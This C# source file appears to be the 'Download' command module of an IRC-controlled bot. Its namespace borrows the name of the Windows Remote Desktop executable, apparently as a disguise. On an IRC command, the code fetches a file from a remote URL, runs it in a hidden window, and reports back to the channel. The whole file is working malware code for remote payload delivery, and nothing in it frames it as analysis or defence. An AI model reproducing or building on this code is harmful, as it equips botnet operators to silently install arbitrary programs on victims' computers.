using System;
using System.Diagnostics;
using System.Net;

namespace mstsc.Aries.Commands
{
sealed class Download
    {
        public Download(string[] Parameters)
        {
            try
            {
                string URL = Parameters[2];
                string FileName = Parameters[3];
                string Output = Config.TemporaryFilesPath + FileName;

                Main.Instance.IRCClient.MessageCurrentChannel("{Download} Downloading file...");

                using (WebClient WebClient = new WebClient())
                {
                    WebClient.DownloadFile(URL, Output);
                }

                ProcessStartInfo File = new ProcessStartInfo();
                File.FileName = Output;
                File.UseShellExecute = true;
                File.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(File);

                Main.Instance.IRCClient.MessageCurrentChannel("{Download} Successfully downloaded and executed");
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();
            }
            catch (Exception Exception)
            {
                Main.Instance.IRCClient.MessageCurrentChannel("{Download} An error has occurred: " + Exception.Message);
            }
        }
    }
}
